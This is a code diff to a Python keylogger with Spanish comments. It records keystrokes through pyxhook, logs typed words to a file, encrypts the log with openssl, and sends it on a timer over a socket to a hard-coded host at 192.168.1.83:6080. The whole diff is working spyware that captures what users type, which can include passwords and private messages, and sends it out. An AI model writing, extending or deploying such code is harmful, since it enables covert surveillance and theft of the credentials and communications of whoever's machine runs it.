@@ -2,7 +2,9 @@ import os
 import pyxhook
 import struct
 import socket
- 
+from threading import Timer
+import time
+import subprocess
 
 def enviarArchivo(sck: socket.socket, archivo):
     # Obtener el tamaño del archivo a enviar.
@@ -14,6 +16,19 @@ def enviarArchivo(sck: socket.socket, archivo):
     with open(archivo, "rb") as f:
         while read_bytes := f.read(1024):
             sck.sendall(read_bytes)
+
+def crearConexion():
+    CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ./public-key/public.pem -pubin"
+    subprocess.call(CMD, shell=True)
+    time.sleep(2)
+    try:
+        with socket.create_connection(("192.168.1.83", 6080)) as conn:
+            enviarArchivo(conn, "file2.log")
+    except:
+        with open(archivo, 'a') as f:
+            f.write('**** El socket no se puede conectar ****')
+            f.write('\n')
+
 
 # Guardamos lo que se va escribiendo antes de presionar espacio o enter
 listaCadena =  []
@@ -31,9 +46,6 @@ if os.environ.get('pylogger_clean', None) is not None:
     except EnvironmentError:
         pass
 
-
-
-
 # Comienza a obtener las teclas
 def OnKeyPress(event):
     # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
@@ -43,16 +55,10 @@ def OnKeyPress(event):
             f.write('\n')
             listaCadena.clear()
         
-        try:
-            with socket.create_connection(("192.168.1.83", 6080)) as conn:
-                #print("Conectado al servidor.")
-                #print("Enviando archivo...")
-                enviarArchivo(conn, "file.log")
-                #print("Enviado.")
-        except:
-            with open(archivo, 'a') as f:
-                f.write('El socket no se puede conectar')
-                f.write('\n')
+        timer = Timer(interval=3, function=crearConexion)
+        timer.daemon=True
+        timer.start()
+
             
     else:
         # Agregamos a la lista la tecla presionada.
